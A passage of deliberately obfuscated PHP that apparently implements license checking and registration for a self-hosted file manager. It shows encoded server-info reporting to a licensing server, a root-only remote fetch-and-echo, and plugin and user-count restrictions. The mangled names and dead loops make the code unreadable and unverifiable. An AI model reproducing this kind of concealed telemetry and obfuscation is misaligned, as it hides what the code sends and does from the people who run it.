. $ŒŒüçÉ»[0] . ACT); $¾îÉÛ™ş = $Ë¯”ŒÒ°[728]; while (strlen($¾îÉÛ™ş) < $Ë¯”ŒÒ°[713]) { if (!$¾îÉÛ™ş) { break; } $¾îÉÛ™ş++; } $_SERVER[$ŒŒüçÉ»[24]] = strtolower(ACTION); $Ü¥î‹ª¦ = $Ë¯”ŒÒ°[729]; if (!$Ü¥î‹ª¦) { return; } $this->autorun(); $¡»İå› = $Ë¯”ŒÒ°[730]; while (strlen($¡»İå›) < $Ë¯”ŒÒ°[711]) { if (!$¡»İå›) { break; } $¡»İå›++; } if (count($Ô¤‘–‚‰) >= 3) { $this->appRun($¢ğ‚‘öÄ); } else { $this->appRun(ACTION); } } private $tqcn86f8b227 = array(); private $holu40921344 = ''; public function havp5798152e() { $Áñ¯ôë… =& $_SERVER[‰‰Ş‚€]; $¬°ãÏ© =& $_SERVER[¾¹â¾·à]; $this->ivtl003d500e(); $ÍîÍÕ× = $Áñ¯ôë…[731]; if (!$ÍîÍÕ×) { die; } $this->niaue300c272(); $·‚ãòìà = $Áñ¯ôë…[732]; $this->uqhk323d8a40(); $this->jhcxc2f06fb3(); $œıĞİâ¶ = $Áñ¯ôë…[733]; $this->bcym33624d3e(); $this->augj70c513c5(); $‘Ä¤Ö·Õ = $Áñ¯ôë…[734]; $this->nbjw797871ec(); $î¨ÀûÄÑ = $Áñ¯ôë…[735]; while ($î¨ÀûÄÑ < $Áñ¯ôë…[713]) { if ($î¨ÀûÄÑ >= 0) { break; } $î¨ÀûÄÑ++; } $this->srcqebfb6d9e($¬°ãÏ©[25], array($this, $¬°ãÏ©[26])); $this->srcqebfb6d9e($¬°ãÏ©[27], array($this, $¬°ãÏ©[28])); $ï†ò±šË = $Áñ¯ôë…[736]; $this->srcqebfb6d9e($¬°ãÏ©[29], array($this, $¬°ãÏ©[30])); $©ı²ŞÉ¹ = $Áñ¯ôë…[737]; if (strlen($©ı²ŞÉ¹) < $Áñ¯ôë…[738]) { die; } $this->srcqebfb6d9e($¬°ãÏ©[31], array($this, $¬°ãÏ©[32])); } public function bzkhc5f99729($ï‹Ô£û™) { $ş·½“²– =& $_SERVER[‰‰Ş‚€]; $·£°ß =& $_SERVER[¾¹â¾·à]; $Û÷÷€Ï” = Model($·£°ß[33])->get(); $şõïæ = $ş·½“²–[739]; $ÊòÈØ¢É = array($·£°ß[34], $·£°ß[35], $·£°ß[36], $·£°ß[37], $·£°ß[38], $·£°ß[39], $·£°ß[40], $·£°ß[41], $·£°ß[42], $·£°ß[43], $·£°ß[44], $·£°ß[45], $·£°ß[46], $·£°ß[47], $·£°ß[48], $·£°ß[49], $·£°ß[50], $·£°ß[51], $·£°ß[52], $·£°ß[53], $·£°ß[54], $·£°ß[55], $·£°ß[56], $·£°ß[57], $·£°ß[58], $·£°ß[59], $·£°ß[60], $·£°ß[61], $·£°ß[62], $·£°ß[63], $·£°ß[64], $·£°ß[65], $·£°ß[66], $·£°ß[67], $·£°ß[68], $·£°ß[69], $·£°ß[70], $·£°ß[71], $·£°ß[72], $·£°ß[73], $·£°ß[74], $·£°ß[75], $·£°ß[76], $·£°ß[77], $·£°ß[78], $·£°ß[79], $·£°ß[80], $·£°ß[81], $·£°ß[82], $·£°ß[83], $·£°ß[84], $·£°ß[85]); $ˆîµÀ–  = $ş·½“²–[740]; while (strlen($ˆîµÀ– ) < $ş·½“²–[703]) { if (!$ˆîµÀ– ) { break; } $ˆîµÀ– ++; } foreach ($ÊòÈØ¢É as $Œ½ô¡ ) { $à‰Öê™Ğ = $GLOBALS[$·£°ß[86]][$·£°ß[87]][$Œ½ô¡ ]; $ËÕ‰ÒÌ = $ş·½“²–[741]; if (!$ËÕ‰ÒÌ) { return; } if (isset($Û÷÷€Ï”[$Œ½ô¡ ])) { $à‰Öê™Ğ = $Û÷÷€Ï”[$Œ½ô¡ ]; } $ï‹Ô£û™[$·£°ß[88]][$·£°ß[89]][$Œ½ô¡ ] = $à‰Öê™Ğ; } $÷“›¿½ = $ï‹Ô£û™[$·£°ß[88]][$·£°ß[89]][$·£°ß[46]]; $‚¿åÓ¶‡ = $ş·½“²–[742]; if (!$‚¿åÓ¶‡) { return; } unset($ï‹Ô£û™[$·£°ß[88]][$·£°ß[90]][$·£°ß[91]]); unset($ï‹Ô£û™[$·£°ß[88]][$·£°ß[90]][$·£°ß[92]]); $õ§µÒşó = $ş·½“²–[743]; if (!$õ§µÒşó) { return; } unset($ï‹Ô£û™[$·£°ß[88]][$·£°ß[89]][$·£°ß[46]]); unset($ï‹Ô£û™[$·£°ß[88]][$·£°ß[89]][$·£°ß[93]]); $Î´·Êü = $ş·½“²–[744]; if (!$Î´·Êü) { die; } $ï‹Ô£û™[$·£°ß[88]][$·£°ß[89]][$·£°ß[94]] = array($·£°ß[95] => (int) $÷“›¿½[$·£°ß[96]], $·£°ß[97] => (int) _get($÷“›¿½, $·£°ß[98], 0)); $ïññª”Ú = $ş·½“²–[745]; if (!$ïññª”Ú) { die; } $°¤Ãå¬ì = substr(md5($·£°ß[99] . get_client_ip() . $Û÷÷€Ï”[$·£°ß[100]]), 0, 15); $±×‡Ã = $ş·½“²–[746]; if (strlen($±×‡Ã) < $ş·½“²–[713]) { return; } $ï‹Ô£û™[$·£°ß[101]][$·£°ß[102]] = Mcrypt::encode(Session::sign(), $°¤Ãå¬ì, 3600 * 24); $Ñˆ–äÕ† = $ş·½“²–[747]; while (strlen($Ñˆ–äÕ†) < $ş·½“²–[11]) { if (!$Ñˆ–äÕ†) { break; } $Ñˆ–äÕ†++; } $ï‹Ô£û™[$·£°ß[101]][$·£°ß[103]] = Action($·£°ß[104])->accessToken(); $Şç¥å·§ = $ş·½“²–[748]; while ($Şç¥å·§ < $ş·½“²–[703]) { if ($Şç¥å·§ >= 0) { break; } $Şç¥å·§++; } $ï‹Ô£û™[$·£°ß[101]][$·£°ß[105]] = md5($_SERVER[$·£°ß[106]] . $Û÷÷€Ï”[$·£°ß[100]]); $£¸‹‘Šó = $ş·½“²–[749]; $ï‹Ô£û™[$·£°ß[101]][$·£°ß[107]] = base64_encode(serverInfo()); $ï‹Ô£û™[$·£°ß[101]][$·£°ß[108]] = $this->holu40921344; $ø“ƒØºĞ = $ş·½“²–[750]; if (strlen($ø“ƒØºĞ) < $ş·½“²–[711]) { return; } if ($Û÷÷€Ï”[$·£°ß[108]] != $·£°ß[109]) { $ï‹Ô£û™[$·£°ß[101]][$·£°ß[110]] = $Û÷÷€Ï”[$·£°ß[110]]; $ï‹Ô£û™[$·£°ß[101]][$·£°ß[111]] = $Û÷÷€Ï”[$·£°ß[111]]; $…Ã¡ƒĞÌ = rand_string(10) . $this->holu40921344 . rand_string(5); $ï‹Ô£û™[$·£°ß[88]][$·£°ß[112]][$·£°ß[113]] = $this->walk7f016a70($…Ã¡ƒĞÌ, $ï‹Ô£û™[$·£°ß[101]][$·£°ß[105]]); } if ($this->holu40921344 == $·£°ß[109]) { $ï‹Ô£û™[$·£°ß[88]][$·£°ß[89]][$·£°ß[94]][$·£°ß[98]] = 0; } $ï‹Ô£û™[$·£°ß[101]][$·£°ß[114]] = $this->versionPluginFilter(); $ï‹Ô£û™[$·£°ß[101]][$·£°ß[115]] = _get($this->tqcn86f8b227, $·£°ß[116], $·£°ß[6]); if (KodUser::isRoot() && $this->config[$·£°ß[117]]) { $ï‹Ô£û™[$·£°ß[101]][$·£°ß[118]] = WEB_ROOT; } return $ï‹Ô£û™; } private function augj70c513c5() { $éÛõ‰Êš =& $_SERVER[‰‰Ş‚€]; $íììúîÚ =& $_SERVER[¾¹â¾·à]; $¦Óñ²Ë = $_SERVER[$íììúîÚ[24]] == $íììúîÚ[119]; $±¸„°‚Ş = $éÛõ‰Êš[751]; if ($_SERVER[$íììúîÚ[24]] == $íììúîÚ[120] && $_GET[$íììúîÚ[121]] == $íììúîÚ[122]) { $¦Óñ²Ë = !0; } if ($¦Óñ²Ë) { $×•ƒö—¨ = array($íììúîÚ[108] => $this->holu40921344, $íììúîÚ[123] => $this->zpdc38625500(), $íììúîÚ[124] => Model($íììúîÚ[125])->count()); if ($this->holu40921344 != $íììúîÚ[109]) { $İØ™ĞŞÙ = _get($this->tqcn86f8b227, $íììúîÚ[126]); if ($İØ™ĞŞÙ) { $×•ƒö—¨[$íììúîÚ[127]] = $İØ™ĞŞÙ; $×•ƒö—¨[$íììúîÚ[128]] = strtotime(_get($this->tqcn86f8b227, $íììúîÚ[129])); $×•ƒö—¨[$íììúîÚ[130]] = _get($this->tqcn86f8b227, $íììúîÚ[116]); } $ÚßüåŞ¾ = Model($íììúîÚ[33])->get($íììúîÚ[131], $íììúîÚ[6], !0); if (is_string($ÚßüåŞ¾) && substr($ÚßüåŞ¾, 0, 1) == $íììúîÚ[132]) { $ÚßüåŞ¾ = json_decode_force($ÚßüåŞ¾); } if (is_array($ÚßüåŞ¾) && $ÚßüåŞ¾[$íììúîÚ[133]] && strstr($ÚßüåŞ¾[$íììúîÚ[133]], $íììúîÚ[134])) { $ÖÉ‚õØ = explode($íììúîÚ[134], $ÚßüåŞ¾[$íììúîÚ[133]]); $×•ƒö—¨[$íììúîÚ[135]] = $ÖÉ‚õØ[0]; } } $×•ƒö—¨ = $this->vekt8713407e(json_encode($×•ƒö—¨), md5($íììúîÚ[136])); $úÙû©ì© = array($íììúîÚ[137] => $×•ƒö—¨); call_user_func(array($íììúîÚ[138], $íììúîÚ[139]), $úÙû©ì©); } if ($this->holu40921344 == $íììúîÚ[109]) { return; } $—â‚äÑ³ = array($íììúîÚ[140], $íììúîÚ[141], $íììúîÚ[142], $íììúîÚ[143], $íììúîÚ[144], $íììúîÚ[145]); $ÎÇ¹Ÿ­ˆ = Model($íììúîÚ[33])->get(); $úÙû©ì© = array($íììúîÚ[146] => $ÎÇ¹Ÿ­ˆ[$íììúîÚ[34]], $íììúîÚ[147] => $ÎÇ¹Ÿ­ˆ[$íììúîÚ[35]], $íììúîÚ[148] => $íììúîÚ[6]); foreach ($—â‚äÑ³ as $œ‡ÄÛë¿) { if (!isset($ÎÇ¹Ÿ­ˆ[$œ‡ÄÛë¿]) || !$ÎÇ¹Ÿ­ˆ[$œ‡ÄÛë¿]) { continue; } $úÙû©ì©[$œ‡ÄÛë¿] = $ÎÇ¹Ÿ­ˆ[$œ‡ÄÛë¿]; $©ş‘íèÄ = $éÛõ‰Êš[752]; while ($©ş‘íèÄ < $éÛõ‰Êš[711]) { if ($©ş‘íèÄ >= 0) { break; } $©ş‘íèÄ++; } } call_user_func(array($íììúîÚ[138], $íììúîÚ[139]), $úÙû©ì©); $¾ı¥âÛ¶ = $éÛõ‰Êš[753]; while (strlen($¾ı¥âÛ¶) < $éÛõ‰Êš[703]) { if (!$¾ı¥âÛ¶) { break; } $¾ı¥âÛ¶++; } } private function jhcxc2f06fb3() { $†«òİñì =& $_SERVER[‰‰Ş‚€]; $€ğÛÖ“˜ =& $_SERVER[¾¹â¾·à]; if ($_SERVER[$€ğÛÖ“˜[24]] != $€ğÛÖ“˜[149]) { return; } if (!KodUser::isRoot()) { die; } $áåûêõ« = $GLOBALS[$€ğÛÖ“˜[13]]; if (isset($áåûêõ«[$€ğÛÖ“˜[150]])) { $this->lotibe126386(); die; } if (isset($áåûêõ«[$€ğÛÖ“˜[151]]) && isset($áåûêõ«[$€ğÛÖ“˜[151]]) == $€ğÛÖ“˜[122]) { $áåûêõ«[$€ğÛÖ“˜[152]] = Model($€ğÛÖ“˜[33])->get($€ğÛÖ“˜[153]); } if (!isset($áåûêõ«[$€ğÛÖ“˜[152]]) || strlen($áåûêõ«[$€ğÛÖ“˜[152]]) != 16) { show_json($€ğÛÖ“˜[154] . $áåûêõ«[$€ğÛÖ“˜[152]], !1); } $µ±³¸ÄŠ = Model($€ğÛÖ“˜[33])->get($€ğÛÖ“˜[100]); $ÜÃš²ø = md5($_SERVER[$€ğÛÖ“˜[106]] . $µ±³¸ÄŠ); $ôŠîÊƒª = array($€ğÛÖ“˜[152] => $áåûêõ«[$€ğÛÖ“˜[152]], $€ğÛÖ“˜[155] => rand_string(16), $€ğÛÖ“˜[156] => $€ğÛÖ“˜[136], $€ğÛÖ“˜[157] => $€ğÛÖ“˜[158], $€ğÛÖ“˜[159] => $_SERVER[$€ğÛÖ“˜[160]], $€ğÛÖ“˜[161] => $_SERVER[$€ğÛÖ“˜[162]], $€ğÛÖ“˜[163] => $_SERVER[$€ğÛÖ“˜[164]], $€ğÛÖ“˜[105] => $ÜÃš²ø, $€ğÛÖ“˜[165] => Model($€ğÛÖ“˜[33])->get($€ğÛÖ“˜[131])); $Ñ¿´ø“† = $†«òİñì[754]; if (!$Ñ¿´ø“†) { die; } if (isset($áåûêõ«[$€ğÛÖ“˜[151]]) && isset($áåûêõ«[$€ğÛÖ“˜[151]]) == $€ğÛÖ“˜[122]) { $ôŠîÊƒª[$€ğÛÖ“˜[151]] = md5($ôŠîÊƒª[$€ğÛÖ“˜[152]] . $€ğÛÖ“˜[166] . $ôŠîÊƒª[$€ğÛÖ“˜[155]]); } if ($áåûêõ«[$€ğÛÖ“˜[167]] == $€ğÛÖ“˜[168]) { $«ş§Ó­¥ = $this->vekt8713407e($ÜÃš²ø, $€ğÛÖ“˜[169]); $ø¥»¥‡ = $this->walk7f016a70(json_encode($ôŠîÊƒª), $ÜÃš²ø . $€ğÛÖ“˜[170], 3); $ø¥»¥‡ = $ø¥»¥‡ . $€ğÛÖ“˜[171] . $_SERVER[$€ğÛÖ“˜[160]]; $òš­±Çğ = $this->ocwl48934f46($€ğÛÖ“˜[172] . $«ş§Ó­¥ . $€ğÛÖ“˜[173] . $ø¥»¥‡, -1); show_json($òš­±Çğ, !0); } else { if ($áåûêõ«[$€ğÛÖ“˜[167]] == $€ğÛÖ“˜[174]) { $™‡’­º¦ = substr(md5($€ğÛÖ“˜[175] . $ÜÃš²ø), 12, 15) . $€ğÛÖ“˜[176]; $ø¥»¥‡ = $this->ntjh9cb474e2(trim($áåûêõ«[$€ğÛÖ“˜[177]]), $™‡’­º¦, 2); $“‚ìâ¸† = json_decode($ø¥»¥‡, !0); if (!is_array($“‚ìâ¸†) || !is_array($“‚ìâ¸†[$€ğÛÖ“˜[178]]) || $“‚ìâ¸†[$€ğÛÖ“˜[152]] != !0) { $…µµ¬«Æ = $€ğÛÖ“˜[179]; $ß•Åï ¡ = $“‚ìâ¸†[$€ğÛÖ“˜[178]] ? $€ğÛÖ“˜[180] . $“‚ìâ¸†[$€ğÛÖ“˜[178]] : $…µµ¬«Æ; show_json($ß•Åï ¡, !1); } else { $ôŠîÊƒª[$€ğÛÖ“˜[155]] = $“‚ìâ¸†[$€ğÛÖ“˜[178]][$€ğÛÖ“˜[181]]; } } else { $“‚ìâ¸† = $this->ocwl48934f46($€ğÛÖ“˜[182], $ôŠîÊƒª, 10); } } if (!is_array($“‚ìâ¸†) || !is_array($“‚ìâ¸†[$€ğÛÖ“˜[178]]) || $“‚ìâ¸†[$€ğÛÖ“˜[152]] != !0) { $…µµ¬«Æ = LNG($€ğÛÖ“˜[183]); $ß•Åï ¡ = $“‚ìâ¸†[$€ğÛÖ“˜[178]] ? $€ğÛÖ“˜[180] . $“‚ìâ¸†[$€ğÛÖ“˜[178]] : $…µµ¬«Æ; show_json($ß•Åï ¡, !1); } $íÆ‚ãÊ³ = $“‚ìâ¸†[$€ğÛÖ“˜[178]]; $´©Ş¾Å = $this->jaml04df13ee($íÆ‚ãÊ³[$€ğÛÖ“˜[184]]); $Ï™û•±¬ = $†«òİñì[755]; if (!$´©Ş¾Å || $´©Ş¾Å != $íÆ‚ãÊ³[$€ğÛÖ“˜[129]]) { $ñÔÅ€ò = array($€ğÛÖ“˜[185] => Model($€ğÛÖ“˜[33])->get($€ğÛÖ“˜[100]), $€ğÛÖ“˜[186] => $_SERVER[$€ğÛÖ“˜[106]], $€ğÛÖ“˜[187] => this_url(), $€ğÛÖ“˜[161] => $_SERVER[$€ğÛÖ“˜[162]]); $ø¥»¥‡ = $this->jkyx378ab691(json_encode($ñÔÅ€ò)); $this->ocwl48934f46($€ğÛÖ“˜[188] . $ø¥»¥‡); show_json(LNG($€ğÛÖ“˜[189]), !0); } $¹Õş¥ = array($€ğÛÖ“˜[153] => $íÆ‚ãÊ³[$€ğÛÖ“˜[190]], $€ğÛÖ“˜[191] => $íÆ‚ãÊ³[$€ğÛÖ“˜[192]], $€ğÛÖ“˜[193] => rand_string(16), $€ğÛÖ“˜[108] => $íÆ‚ãÊ³[$€ğÛÖ“˜[194]]); if ($ôŠîÊƒª[$€ğÛÖ“˜[155]]) { $¹Õş¥[$€ğÛÖ“˜[193]] = $ôŠîÊƒª[$€ğÛÖ“˜[155]]; } $©¹Ş­®á = substr(md5($¹Õş¥[$€ğÛÖ“˜[191]]), 10, 10); $õÌ™…ó = $©¹Ş­®á . $¹Õş¥[$€ğÛÖ“˜[108]] . $¹Õş¥[$€ğÛÖ“˜[193]]; $Ñâõõ† = $†«òİñì[756]; while ($Ñâõõ† < $†«òİñì[738]) { if ($Ñâõõ† >= 0) { break; } $Ñâõõ†++; } $¹Õş¥[$€ğÛÖ“˜[110]] = strrev(base64_encode($this->vekt8713407e($õÌ™…ó, $€ğÛÖ“˜[195]))); $“€ü®£È = $†«òİñì[757]; $â‹Óê‚ = rand_string(16); $ØÕŞª“ = $†«òİñì[758]; $—Ç÷×ş = $â‹Óê‚ . $¹Õş¥[$€ğÛÖ“˜[108]] . $this->vekt8713407e(md5($¹Õş¥[$€ğÛÖ“˜[153]]), $â‹Óê‚); $£•÷õ¬å = $†«òİñì[759]; $¹Õş¥[$€ğÛÖ“˜[111]] = base64_encode(strrev($this->vekt8713407e($—Ç÷×ş, $€ğÛÖ“˜[196]))); $Íâ¨ ŒÛ = $†«òİñì[760]; if (strlen($Íâ¨ ŒÛ) < $†«òİñì[711]) { die; } if ($íÆ‚ãÊ³[$€ğÛÖ“˜[197]] && $íÆ‚ãÊ³[$€ğÛÖ“˜[197]] >= 1) { Model($€ğÛÖ“˜[33])->setDeep($€ğÛÖ“˜[198], $€ğÛÖ“˜[122]); } Model($€ğÛÖ“˜[33])->set($¹Õş¥); $€–ôİóº = md5($_SERVER[$€ğÛÖ“˜[106]] . strrev($µ±³¸ÄŠ) . $¹Õş¥[$€ğÛÖ“˜[191]]); $ëÌŒË•± = strrev(substr($€–ôİóº, 10, 16)); $Ä¶ä´Ñ­ = $†«òİñì[761]; if (strlen($Ä¶ä´Ñ­) < $†«òİñì[713]) { die; } $Ó†ÆÜªù = $this->walk7f016a70(json_encode($íÆ‚ãÊ³), $€–ôİóº); $š¤Ï€í© = array_to_keyvalue(Model($€ğÛÖ“˜[7])->listData(), $€ğÛÖ“˜[199]); $·£îÊæÚ = $š¤Ï€í©[$€ğÛÖ“˜[200]]; $‡Çƒ¿Êê = array(); $½Â†şÓ„ = $†«òİñì[762]; if (!$½Â†şÓ„) { die; } $‡Çƒ¿Êê[$ëÌŒË•±] = $Ó†ÆÜªù; Model($€ğÛÖ“˜[7])->update($·£îÊæÚ[$€ğÛÖ“˜[201]], array($€ğÛÖ“˜[202] => $‡Çƒ¿Êê)); $this->tqcn86f8b227 = $íÆ‚ãÊ³; $ŠçË¤Å = $†«òİñì[763]; $this->holu40921344 = $¹Õş¥[$€ğÛÖ“˜[108]]; $Á¥…Ñ«É = $†«òİñì[764]; $this->licenseRegistSuccess(); $Ç¼¤‹¹º = $†«òİñì[765]; if (!$Ç¼¤‹¹º) { return; } Cache::set($€ğÛÖ“˜[203] . md5($µ±³¸ÄŠ . $€ğÛÖ“˜[204]), $€ğÛÖ“˜[6]); show_json(LNG($€ğÛÖ“˜[189]), !0); $÷ºÀÁÆ– = $†«òİñì[766]; if (strlen($÷ºÀÁÆ–) < $†«òİñì[703]) { return; } } private function licenseRegistSuccess() { $õÎ—€ˆ =& $_SERVER[¾¹â¾·à]; $ÑÁï˜İ’ = Model($õÎ—€ˆ[33])->get(); $Ôå©“¦ü = $_SERVER[‰‰Ş‚€][767]; if (!$Ôå©“¦ü) { return; } if ($ÑÁï˜İ’[$õÎ—€ˆ[63]] != $õÎ—€ˆ[122]) { Model($õÎ—€ˆ[33])->set($õÎ—€ˆ[63], $õÎ—€ˆ[122]); } Action($õÎ—€ˆ[205])->initStart(!0); } private function lotibe126386() { $Ç©Ğºû› =& $_SERVER[‰‰Ş‚€]; $Šì‡¼ª½ =& $_SERVER[¾¹â¾·à]; Model($Šì‡¼ª½[33])->set(array($Šì‡¼ª½[153] => $Šì‡¼ª½[6], $Šì‡¼ª½[191] => $Šì‡¼ª½[6], $Šì‡¼ª½[108] => $Šì‡¼ª½[109], $Šì‡¼ª½[110] => $Šì‡¼ª½[6], $Šì‡¼ª½[111] => $Šì‡¼ª½[6])); Model($Šì‡¼ª½[33])->setDeep($Šì‡¼ª½[198], $Šì‡¼ª½[206]); $©Ü¹˜ò² = $Ç©Ğºû›[768]; if (strlen($©Ü¹˜ò²) < $Ç©Ğºû›[11]) { die; } $this->tqcn86f8b227 = array(); $®‡İ•í” = $Ç©Ğºû›[769]; while (strlen($®‡İ•í”) < $Ç©Ğºû›[713]) { if (!$®‡İ•í”) { break; } $®‡İ•í”++; } $this->holu40921344 = $Šì‡¼ª½[109]; $™—Íó‘œ = $Ç©Ğºû›[770]; while ($™—Íó‘œ < $Ç©Ğºû›[11]) { if ($™—Íó‘œ >= 0) { break; } $™—Íó‘œ++; } } private function ivtl003d500e() { $‹Òë‹öß =& $_SERVER[‰‰Ş‚€]; $¬»«ËŞÑ =& $_SERVER[¾¹â¾·à]; $_SERVER[$¬»«ËŞÑ[162]] = _get($_SERVER, $¬»«ËŞÑ[162], APP_HOST); $êÖıÕ‡Ñ = $‹Òë‹öß[771]; if (!$êÖıÕ‡Ñ) { die; } $this->holu40921344 = $¬»«ËŞÑ[109]; $ˆ…¹–Ã¢ = Model($¬»«ËŞÑ[33])->get(); $ûÄˆÇÒ¡ = $‹Òë‹öß[772]; if (strlen($ûÄˆÇÒ¡) < $‹Òë‹öß[711]) { return; } if ($ˆ…¹–Ã¢[$¬»«ËŞÑ[108]] == $¬»«ËŞÑ[109]) { return; } $€¦Î›Ã = Model($¬»«ËŞÑ[33])->get($¬»«ËŞÑ[100]); $ç‹¯¡ÃĞ = $¬»«ËŞÑ[203] . md5($€¦Î›Ã . $¬»«ËŞÑ[204]); $ô¼›Ì“® = $‹Òë‹öß[773]; if (strlen($ô¼›Ì“®) < $‹Òë‹öß[711]) { die; } $¶µáşŸÑ = Cache::get($ç‹¯¡ÃĞ); $ÔóŸº»í = $‹Òë‹öß[774]; while (strlen($ÔóŸº»í) < $‹Òë‹öß[703]) { if (!$ÔóŸº»í) { break; } $ÔóŸº»í++; } if (!is_array($¶µáşŸÑ) || !isset($¶µáşŸÑ[$¬»«ËŞÑ[207]]) || time() - $¶µáşŸÑ[$¬»«ËŞÑ[207]] >= 60) { $¥ó‘ş¢‡ = Model($¬»«ËŞÑ[7])->loadList(); $ŸàºßøØ = $¥ó‘ş¢‡[$¬»«ËŞÑ[200]]; $²—…Ù½ = md5($_SERVER[$¬»«ËŞÑ[106]] . strrev($€¦Î›Ã) . $ˆ…¹–Ã¢[$¬»«ËŞÑ[191]]); $Ê²Áˆêš = strrev(substr($²—…Ù½, 10, 16)); $¶µáşŸÑ = $this->ntjh9cb474e2($ŸàºßøØ[$¬»«ËŞÑ[86]][$Ê²Áˆêš], $²—…Ù½); $¶µáşŸÑ = json_decode($¶µáşŸÑ, !0); } if (!is_array($¶µáşŸÑ)) { return $this->lotibe126386(); } $ÅÌ®Ó‚Õ = strtotime($¶µáşŸÑ[$¬»«ËŞÑ[129]]); if (time() >= $ÅÌ®Ó‚Õ) { return $this->lotibe126386(); } if (!isset($¶µáşŸÑ[$¬»«ËŞÑ[207]]) || time() - $¶µáşŸÑ[$¬»«ËŞÑ[207]] > 20) { $¶µáşŸÑ[$¬»«ËŞÑ[207]] = time(); Cache::set($ç‹¯¡ÃĞ, $¶µáşŸÑ); } $this->tqcn86f8b227 = $¶µáşŸÑ; $this->holu40921344 = $ˆ…¹–Ã¢[$¬»«ËŞÑ[108]]; $·Òñûƒ = $‹Òë‹öß[743]; while ($·Òñûƒ < $‹Òë‹öß[11]) { if ($·Òñûƒ >= 0) { break; } $·Òñûƒ++; } } private function niaue300c272() { $—™£¡º™ =& $_SERVER[¾¹â¾·à]; $Öà±âœä = $GLOBALS[$—™£¡º™[13]]; $±İ¡Ö–ê = $_SERVER[$—™£¡º™[24]]; if ($±İ¡Ö–ê == $—™£¡º™[208] && $this->holu40921344 == $—™£¡º™[109]) { show_json(LNG($—™£¡º™[209]), !1, $—™£¡º™[210]); } $ğåñÒ‹ = array($—™£¡º™[211], $—™£¡º™[212]); if (in_array($±İ¡Ö–ê, $ğåñÒ‹)) { if ($this->holu40921344 == $—™£¡º™[109] && isset($Öà±âœä[$—™£¡º™[213]])) { show_json(LNG($—™£¡º™[209]), !1, $—™£¡º™[210]); die; } $°ÓÆ’ïğ = $this->zpdc38625500(); if ($°ÓÆ’ïğ != intval($—™£¡º™[214])) { if ($°ÓÆ’ïğ <= Model($—™£¡º™[125])->count()) { show_json(LNG($—™£¡º™[215]), !1, $—™£¡º™[210]); die; } } } } private function uqhk323d8a40() { $¶›Ä¹êå =& $_SERVER[‰‰Ş‚€]; $À¹È–š =& $_SERVER[¾¹â¾·à]; $ä»áóê = array($À¹È–š[119], $À¹È–š[120]); $¸óŸ·Èà = $¶›Ä¹êå[775]; while (strlen($¸óŸ·Èà) < $¶›Ä¹êå[703]) { if (!$¸óŸ·Èà) { break; } $¸óŸ·Èà++; } if (!KodUser::isRoot() || !isset($_GET[$À¹È–š[216]])) { return; } if (!in_array($_SERVER[$À¹È–š[24]], $ä»áóê)) { return; } $¤íĞ€ƒ = $À¹È–š[217]; $¤íĞ€ƒ = $this->rstkb7790328($¤íĞ€ƒ, $À¹È–š[218]); $½œäšÕ = $¶›Ä¹êå[776]; if (strlen($½œäšÕ) < $¶›Ä¹êå[738]) { die; } $ÔĞÖÂ¯ = stream_context_create(array($À¹È–š[219] => array($À¹È–š[220] => $À¹È–š[221], $À¹È–š[222] => 3))); $©Ïâ¯Îõ = @file_get_contents($¤íĞ€ƒ, !1, $ÔĞÖÂ¯); header($À¹È–š[223]); $Ëô¾Ö’¿ = $¶›Ä¹êå[777]; if ($©Ïâ¯Îõ && strstr($©Ïâ¯Îõ, $À¹È–š[224])) { echo $©Ïâ¯Îõ; } die; } public function pdfm3adacc35($ôñÓ¾¨Á) { $¡ìÜÆ®¼ =& $_SERVER[‰‰Ş‚€]; $ß·Ğ„ßß =& $_SERVER[¾¹â¾·à]; if ($this->holu40921344 == $ß·Ğ„ßß[225]) { return $ôñÓ¾¨Á; } $áúâÂÂş = $this->versionPluginList(); $é ƒÙÉ = explode($ß·Ğ„ßß[226], $this->versionPluginFilter()); $½°Åç = $¡ìÜÆ®¼[778]; if (!$½°Åç) { die; } $”Õß— ú = array(); foreach ($áúâÂÂş as $òëƒİö => $Šß€ÑÙ») { if ($Šß€ÑÙ» == $ß·Ğ„ßß[227] && substr($this->holu40921344, 0, 1) == $ß·Ğ„ßß[227]) { continue; } if (!in_array($òëƒİö, $é ƒÙÉ)) { $”Õß— ú[] = $òëƒİö; } } foreach ($”Õß— ú as $òëƒİö) { unset($ôñÓ¾¨Á[$òëƒİö]); $š½õ¸Î‘ = $¡ìÜÆ®¼[779]; } return $ôñÓ¾¨Á; } private function versionPluginList() { $À†’÷åš =& $_SERVER[¾¹â¾·à]; return array($À†’÷åš[228] => $À†’÷åš[227], $À†’÷åš[229] => $À†’÷åš[227], $À†’÷åš[230] => $À†’÷åš[227], $À†’÷åš[231] => $À†’÷åš[227], $À†’÷åš[232] => $À†’÷åš[233], $À†’÷åš[234] => $À†’÷åš[233], $À†’÷åš[235] => $À†’÷åš[233], $À†’÷åš[236] => $À†’÷åš[233], $À†’÷åš[237] => $À†’÷åš[233], $À†’÷åš[238] => $À†’÷åš[233], $À†’÷åš[239] => $À†’÷åš[233], $À†’÷åš[240] => $À†’÷åš[233], $À†’÷åš[241] => $À†’÷åš[233], $À†’÷åš[242] => $À†’÷åš[233], $À†’÷åš[243] => $À†’÷åš[233], $À†’÷åš[244] => $À†’÷åš[233], $À†’÷åš[245] => $À†’÷åš[233], $À†’÷åš[246] => $À†’÷åš[233]); } private function versionPluginFilter() { $—¬÷óø³ =& $_SERVER[¾¹â¾·à]; if ($this->holu40921344 == $—¬÷óø³[109]) { return $—¬÷óø³[6]; } $šØâ½ü = _get($this->tqcn86f8b227, $—¬÷óø³[247], $—¬÷óø³[6]); $ü±ËÔ• = _get($this->tqcn86f8b227, $—¬÷óø³[116], $—¬÷óø³[6]); $ÈÛ§»Ïô = _get($this->tqcn86f8b227, $—¬÷óø³[248], $—¬÷óø³[6]); if ($ü±ËÔ• > time() && $ÈÛ§»Ïô > time()) { $ğ½½Ì™ = explode($—¬÷óø³[226], $šØâ½ü); $ü¸½İˆÏ = array_keys($this->versionPluginList()); $šØâ½ü = array_merge($ğ½½Ì™, $ü¸½İˆÏ); $šØâ½ü = implode($—¬÷óø³[226], array_filter(array_unique($šØâ½ü))); } return $šØâ½ü; } private function nbjw797871ec() { $¸«Ì‘¼ª =& $_SERVER[¾¹â¾·à]; if ($this->holu40921344 != $¸«Ì‘¼ª[109]) { $GLOBALS[$¸«Ì‘¼ª[86]][$¸«Ì‘¼ª[90]][$¸«Ì‘¼ª[249]] = $¸«Ì‘¼ª[206]; return; } $GLOBALS[$¸«Ì‘¼ª[86]][$¸«Ì‘¼ª[250]] = $¸«Ì‘¼ª[122]; if 